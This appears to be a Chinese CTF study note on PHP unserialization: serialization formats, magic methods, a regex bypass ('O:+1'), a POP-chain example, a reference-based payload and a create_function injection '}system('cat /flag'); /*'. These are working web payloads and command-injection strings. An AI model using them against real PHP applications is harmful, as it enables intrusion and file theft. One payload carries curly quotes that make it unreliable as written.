# 1.序列化

## 数组序列化

```php
 <?php
highlight_file(__FILE__);
$a = array('benben','dazhuang','laoliu');
echo $a[0];
echo serialize($a);
?>
benbena:3:{i:0;s:6:"benben";i:1;s:8:"dazhuang";i:2;s:6:"laoliu";}
```

## 对象序列化

```php
 <?php
highlight_file(__FILE__);
class test{
    private $pub='benben';
    function jineng(){
        echo $this->pub;
    }
}
$a = new test();
echo serialize($a);
?>
O:4:"test":1:{s:9:"testpub";s:6:"benben";}
```

## 保护修饰符

```php
 <?php
highlight_file(__FILE__);
class test{
    protected $pub='benben';
    function jineng(){
        echo $this->pub;
    }
}
$a = new test();
echo serialize($a);
?>
O:4:"test":1:{s:6:"%00*%00pub";s:6:"benben";}
```

## 私有修饰符

```php
 <?php
highlight_file(__FILE__);
class test{
    private $pub='benben';
    function jineng(){
        echo $this->pub;
    }
}
$a = new test();
echo serialize($a);
?>
O:4:"test":1:{s:9:"%00test%00pub";s:6:"benben";}
```

## 成员调用对象属性

```php
 <?php
highlight_file(__FILE__);
class test{
    var $pub='benben';
    function jineng(){
        echo $this->pub;
    }
}
class test2{
    var $ben;
    function __construct(){
        $this->ben=new test();
    }
}
$a = new test2();
echo serialize($a);
?>
O:5:"test2":1:{s:3:"ben";O:4:"test":1:{s:3:"pub";s:6:"benben";}}
```

在hackbar中提交时要进行url编码

# 2.魔术方法

__construct 构造函数

__destruct 析构函数

__sleep 序列化时调用该函数

__wakeup 反序列化时调用该函数

__toString 对象当做字符串时调用该函数

__invoke 对象当做函数时调用该函数

__call 调用不存在的方法

__callStatic 静态调用的方法不存在

__set 给不存在的成员变量赋值

__get 调用的成员变量不存在

__isset 对不可访问的属性使用isset或empty时

__debuginfo 调用var_dump时调用

__unset 对不可访问的属性使用unset

__clone 拷贝完成一个对象后

```php
 <?php
highlight_file(__FILE__);
error_reporting(0);
class User {
    private $var;
    public function __isset($arg1 )
    {
        echo  $arg1;
    }
}
$test = new User() ;
isset($test->var);
?>

var 
```

__unset 对不可访问的属性使用unset

```php
 <?php
highlight_file(__FILE__);
error_reporting(0);
class User {
    private $var;
    public function __unset($arg1 )
    {
        echo  $arg1;
    }
}
$test = new User() ;
unset($test->var);
?>

var 
```

__clone 拷贝完成一个对象后

```php
 <?php
highlight_file(__FILE__);
error_reporting(0);
class User {
    private $var;
    public function __clone( )
    {
        echo  "__clone test";
          }
}
$test = new User() ;
$newclass = clone($test)
?>
__clone test
```



# 3.字符串逃逸

## 1.字符串逃逸减少



# 绕过

```
/[oc]:\d+:/i   //出自ctfshow 反序列化web258
```

正则的意思为o或者c后面加：以后不能跟数字

### 绕过方法：

```
O:+1   //在:后面，数字前面加“+”
```



# 5.例题

```php
 <?php
//flag is in flag.php
highlight_file(__FILE__);
error_reporting(0);
class Modifier {
    private $var;
    public function append($value)
    {
        include($value);
        echo $flag;
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __toString(){
        return $this->str->source;
    }
    public function __wakeup(){
        echo $this->source;
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    unserialize($_GET['pop']);
}
?> 
```

# 6.引用绕过

在 PHP 中，R 代表引用（Reference），它可以让多个变量指向同一个值，从而节省内存空间。
在上面的序列化字符串中，R:2 表示这个变量的值是第二个出现的变量的值的引用。换句话说，这个变量和第二个变量指向同一个值

例题：

```php
<?php
include("flag.php");
class just4fun {
    var $enter;
    var $secret;
}

if (isset($_GET['pass'])) {
    $pass = $_GET['pass'];
    $pass=str_replace('*','\*',$pass);
}

$o = unserialize($pass);

if ($o) {
    $o->secret = "*";
    if ($o->secret === $o->enter)
        echo "Congratulation! Here is my secret: ".$flag;
    else
        echo "Oh no... You can't fool me";
}
else echo "are you trolling?";
?>

```

**构造poc链条：**

```php
<?php
class just4fun {
    var $enter;
    var $secret;
}
$a = new just4fun();
$a ->enter=&$a ->secret;
echo serialize($a);
?>

```

```
payload:O:8:“just4fun”:2:{s:5:“enter”;N;s:6:“secret”;R:2;}
```

# 7.create_function函数

```php
create_function('$a, $b', 'return "ln($a) + ln($b) = " . log($a * $b)');
```

等价于

```php
function lambda_1($a, $b) {
    return "ln($a) + ln($b) = " . log($a * $b);
}
```

所以可以凑一个闭合来进行命令执行

```php
?cmd=}system('cat /flag'); /*
```

等价于

```php
<?php
function lambda_1() {
}system('cat /flag');
/*}
```

